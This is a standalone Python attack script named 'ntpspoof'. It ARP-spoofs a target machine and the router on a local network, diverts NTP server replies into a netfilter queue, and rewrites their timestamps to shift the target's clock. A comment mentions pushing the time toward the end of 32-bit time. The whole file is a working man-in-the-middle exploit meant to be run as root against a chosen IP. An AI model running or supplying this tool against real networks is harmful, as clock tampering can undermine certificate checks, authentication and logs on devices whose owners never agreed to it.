#!/usr/bin/env python3

'''
Requirements (Debian)
sudo apt install dsniff libnetfilter-queue-dev
sudo pip install netfilterqueue 
'''

import os
import subprocess
import sys
import time
from subprocess import Popen, DEVNULL
import datetime
from scapy.all import IP, UDP, NTP
from netfilterqueue import NetfilterQueue


def get_switch_ip():    
    cmd = "route -n | grep ^0.0.0.0 | cut -d \" \" -f 10"
    return subprocess.check_output(cmd, shell=True, universal_newlines=True).rstrip()    


SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
NTP_EPOCH = datetime.date(1900, 1, 1)
NTP_DELTA = (SYSTEM_EPOCH - NTP_EPOCH).days * 24 * 3600


def ntp_to_system_time(date):
    """convert a NTP time to system time"""
    return date - NTP_DELTA


def system_to_ntp_time(date):
    """convert a system time to a NTP time"""
    return date + NTP_DELTA

# SET TIME TO END OF THE 32-bit DAYS
def upgrade_year(dtime):
    #new_time = datetime.datetime(2025, 1, 18, 23, 59, dtime.second, dtime.microsecond)
    new_time = dtime + datetime.timedelta(minutes=5)
    return new_time.timestamp()


def modify_package(pkg):
    if pkg.haslayer(NTP):
        ntp = pkg.getlayer(NTP)
    else:
        ntp = NTP(pkg.load)
    if ntp.mode == 4:  # server
        # convert to utc time
        new_ref = float(ntp_to_system_time(ntp.ref))
        new_recv = float(ntp_to_system_time(ntp.recv))
        new_sent = float(ntp_to_system_time(ntp.sent))

        # upgrade the year
        new_ref = upgrade_year(datetime.datetime.fromtimestamp(new_ref))
        new_recv = upgrade_year(datetime.datetime.fromtimestamp(new_recv))
        new_sent = upgrade_year(datetime.datetime.fromtimestamp(new_sent))

        # convert to utc timestamp
        ntp.recv = system_to_ntp_time(new_recv)
        ntp.sent = system_to_ntp_time(new_sent)
        ntp.ref = system_to_ntp_time(new_ref)

    pkg.load = bytes(ntp)
    return pkg


def manipulate(netpackage):
    #print(netpackage.get_payload())
    pkg = IP(netpackage.get_payload())
    #print(pkg)
    udp = pkg.getlayer(UDP)

    print('Received package for:', pkg.dst, end=' -> ')

    # delete checksum to recalculate
    del pkg.chksum
    del udp.chksum
    pkg_m = modify_package(pkg)
    print('Modified!')

    # set the packet content to our modified version
    netpackage.set_payload(bytes(pkg_m))
    netpackage.accept()  # accept the packet


if __name__ == '__main__':
    if os.geteuid() != 0:
        print('You have to run the script as root')
        exit(1)

    if len(sys.argv) < 2:
        print('Usage: ntpspoof <target_ip> <net interface (Optional)>')
        print('Example: ntpspoof 192.168.2.99 eth0')
        exit(1)

    if len(sys.argv) < 3:
        print('No network interface specified. Using \'eth0\'')
        iface = 'eth0'
    else:
        iface = sys.argv[2]

    # calculate IP addresses
    ip_addr = sys.argv[1]
    router_ip = '192.168.0.100'

    print('Running ARP spoofing for target:', ip_addr,
          'using the router:', router_ip)
    p = Popen(['arpspoof', '-i', 'eth0', '-t', router_ip, ip_addr],
              stderr=DEVNULL, stdout=DEVNULL)

    # run iptables
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        print('1\n', file=f)
    #print('here')
    os.system('iptables -t raw -A PREROUTING -p udp -d '
              + ip_addr + ' --sport 123 -j NFQUEUE --queue-num 99')
    #print('here2')
    nfqueue = NetfilterQueue()
    # 99 is the iptabels rule queue number, modify is the callback function
    nfqueue.bind(99, manipulate)
    try:
        print("[*] waiting for NTP packages")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfqueue.unbind()
        p.terminate()
        os.system('iptables -F -vt raw')
